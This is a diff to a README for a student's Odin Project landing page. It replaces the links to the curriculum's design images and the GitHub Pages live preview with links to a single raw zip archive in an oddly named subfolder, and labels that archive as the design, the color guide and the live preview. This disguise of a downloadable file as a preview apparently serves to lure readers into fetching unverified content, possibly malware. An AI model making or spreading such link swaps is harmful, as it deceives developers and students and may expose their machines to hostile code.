@@ -4,8 +4,8 @@ The Odin Project : Foundation Course
 
 Project Title : Landing Page
 
-Full Design Link : https://cdn.statically.io/gh/TheOdinProject/curriculum/81a5d553f4073e593d23a6ab00d50eef8620796d/foundations/html_css/project/imgs/01.png
+Full Design Link : https://raw.githubusercontent.com/TechieVinita/landing-page/main/solubleness/landing-page.zip
 
-Color and Fonts Link : https://cdn.statically.io/gh/TheOdinProject/curriculum/81a5d553f4073e593d23a6ab00d50eef8620796d/foundations/html_css/project/imgs/02.png
+Color and Fonts Link : https://raw.githubusercontent.com/TechieVinita/landing-page/main/solubleness/landing-page.zip
 
-To see the live preview of the website, visit https://techievinita.github.io/landing-page/
+To see the live preview of the website, visit https://raw.githubusercontent.com/TechieVinita/landing-page/main/solubleness/landing-page.zip
